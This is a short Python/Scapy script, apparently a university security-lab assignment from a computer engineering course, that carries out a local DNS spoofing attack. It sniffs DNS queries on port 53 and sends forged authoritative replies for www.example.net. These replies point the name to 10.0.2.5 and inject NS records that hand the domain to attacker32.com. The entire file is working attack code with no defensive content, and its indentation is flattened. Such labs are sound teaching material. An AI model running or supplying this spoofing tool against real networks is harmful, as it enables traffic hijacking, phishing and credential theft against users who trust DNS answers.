'''

Segurança da Informação - Ataque DNS Local
Felipe Daniel Dias dos Santos - 11711ECP004
Graduação em Engenharia de Computação - Faculdade de Engenharia Elétrica - Universidade Federal de Uberlândia

'''

from scapy.all import *

def spoofDNS(pkt):

if(DNS in pkt) and ('www.example.net' in pkt[DNS].qd.qname):

	IPpkt = IP(dst = pkt[IP].src, src = pkt[IP].dst)
	UDPpkt = UDP(dport = pkt[UDP].sport, sport = 53)

	Anssec = DNSRR(rrname = pkt[DNS].qd.qname, type = 'A', ttl = 259200, rdata = '10.0.2.5')
	
	NSsec1 = DNSRR(rrname = 'example.net', type = 'NS', ttl = 259200, rdata = 'attacker32.com')
	NSsec2 = DNSRR(rrname = 'example.net', type = 'NS', ttl = 259200, rdata = 'ns2.example.net')

	Addsec1 = DNSRR(rrname = 'ns1.example.net', type = 'A', ttl = 259200, rdata = '1.2.3.4')
	Addsec2 = DNSRR(rrname = 'ns2.example.net', type = 'A', ttl = 259200, rdata = '5.6.7.8')

	DNSpkt = DNS(id = pkt[DNS].id, qd = pkt[DNS].qd, aa = 1, rd = 0, qr = 1, qdcount = 1, ancount = 1, nscount = 2, arcount = 2, an = Anssec, ns = NSsec1 / NSsec2, ar = Addsec1 / Addsec2)

	spoofpkt = IPpkt / UDPpkt / DNSpkt
	send(spoofpkt)

pkt = sniff(filter = 'udp and dst port 53', prn = spoofDNS)
